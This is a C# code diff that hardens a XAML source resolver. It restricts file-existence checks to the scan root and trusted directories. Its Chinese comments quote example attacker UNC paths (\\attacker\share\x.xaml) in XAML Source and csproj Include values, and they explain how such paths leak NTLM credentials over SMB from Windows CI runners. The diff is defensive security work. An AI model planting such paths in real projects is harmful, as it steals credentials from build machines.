@@ -58,9 +58,42 @@ public sealed partial class SourceResolver
         foreach (var (assembly, path) in externalDictionaries)
         {
             var dir = Path.IsPathRooted(path) ? path : Path.GetFullPath(Path.Combine(_root, path));
-            if (Directory.Exists(dir)) _assemblies[assembly] = dir;
+            if (Directory.Exists(dir))
+            {
+                _assemblies[assembly] = dir;
+                _trusted.Add(Path.GetFullPath(dir));
+            }
         }
     }
+
+    /// <summary>
+    /// 只認**掃描根底下**的檔（以及使用者在自己的 config 裡指名的外部字典目錄）。
+    /// </summary>
+    /// <remarks>
+    /// ⚠ 這支工具會在 CI 上掃別人的 repo。合併路徑與 csproj 的 Include 都是對方寫的：
+    ///   <c>Source="\\attacker\share\x.xaml"</c> 或 <c>&lt;Page Include="\\attacker\share\x.xaml" Link="…"&gt;</c>
+    ///   一旦拿去查檔案存不存在，Windows runner 會向那台主機發 SMB 連線、送出 NTLM 認證；
+    ///   絕對路徑則會讀到掃描範圍外的檔（內容的鍵名可能出現在報告裡）。
+    ///   Path.GetFullPath 只是字串運算、不碰網路 —— 存在與否的檢查一定要先過這一關。
+    ///   2026-11-15 加 csproj Link 時由自動安全審查指出；XAML 的 Source 從第一版就有同樣的洞，一起補。
+    /// </remarks>
+    private bool Exists(string full) => IsAllowed(full) && Probe(full);
+
+    /// <summary>真正去查檔案系統的那一步。測試換成記錄器，確認範圍外的路徑**從來沒被查過**。</summary>
+    internal Func<string, bool> Probe { get; set; } = File.Exists;
+
+    private bool IsAllowed(string full)
+    {
+        if (Under(full, _root)) return true;
+        foreach (var d in _trusted) if (Under(full, d)) return true;
+        return false;
+
+        static bool Under(string path, string dir) =>
+            path.StartsWith(dir.TrimEnd(Path.DirectorySeparatorChar, Path.AltDirectorySeparatorChar) + Path.DirectorySeparatorChar,
+                            StringComparison.OrdinalIgnoreCase);
+    }
+
+    private readonly List<string> _trusted = [];
 
     /// <summary>
     /// csproj 裡從別處連結進來的 XAML：(專案目錄, 連結後的相對路徑) → 實際的檔。
@@ -100,7 +133,7 @@ public sealed partial class SourceResolver
 
     /// <summary>這個專案目錄底下的相對路徑，是不是連結進來的檔？</summary>
     private string? Linked(string projectDir, string relative) =>
-        _links.TryGetValue((projectDir, NormalizeLink(relative)), out var target) && File.Exists(target) ? target : null;
+        _links.TryGetValue((projectDir, NormalizeLink(relative)), out var target) && Exists(target) ? target : null;
 
     public SourceResolution Resolve(string rawSource, string containingFile)
     {
@@ -123,7 +156,7 @@ public sealed partial class SourceResolver
                 return new(null, $"assembly '{assembly}' is not in the scanned tree", assembly);
 
             var crossed = Path.GetFullPath(Path.Combine(projDir, path));
-            return File.Exists(crossed)
+            return Exists(crossed)
                 ? new(crossed, null, assembly)
                 : new(null, $"'{path}' not found in assembly '{assembly}'", assembly);
         }
@@ -136,7 +169,7 @@ public sealed partial class SourceResolver
             foreach (var baseDir in ProjectRootsFor(containingFile))
             {
                 var abs = Path.GetFullPath(Path.Combine(baseDir, path));
-                if (File.Exists(abs)) return new(abs, null, null);
+                if (Exists(abs)) return new(abs, null, null);
                 if (Linked(baseDir, path) is { } linked) return new(linked, null, null);
             }
 
@@ -151,7 +184,7 @@ public sealed partial class SourceResolver
                 if (slash > 0 && _assemblies.TryGetValue(path[..slash], out var asmDir))
                 {
                     var inAsm = Path.GetFullPath(Path.Combine(asmDir, path[(slash + 1)..]));
-                    if (File.Exists(inAsm)) return new(inAsm, null, path[..slash]);
+                    if (Exists(inAsm)) return new(inAsm, null, path[..slash]);
                 }
             }
 
@@ -161,13 +194,13 @@ public sealed partial class SourceResolver
         // 相對路徑：相對於引用它的那個檔
         var dir = Path.GetDirectoryName(Path.GetFullPath(containingFile)) ?? _root;
         var rel = Path.GetFullPath(Path.Combine(dir, path));
-        if (File.Exists(rel)) return new(rel, null, null);
+        if (Exists(rel)) return new(rel, null, null);
 
         // 退路：有些專案把相對路徑寫成相對於專案根
         foreach (var baseDir in ProjectRootsFor(containingFile))
         {
             var abs = Path.GetFullPath(Path.Combine(baseDir, path));
-            if (File.Exists(abs)) return new(abs, null, null);
+            if (Exists(abs)) return new(abs, null, null);
             // 連結進來的檔：相對於引用它的檔、換算成專案內的路徑再查
             if (Linked(baseDir, Path.GetRelativePath(baseDir, rel)) is { } linked) return new(linked, null, null);
         }
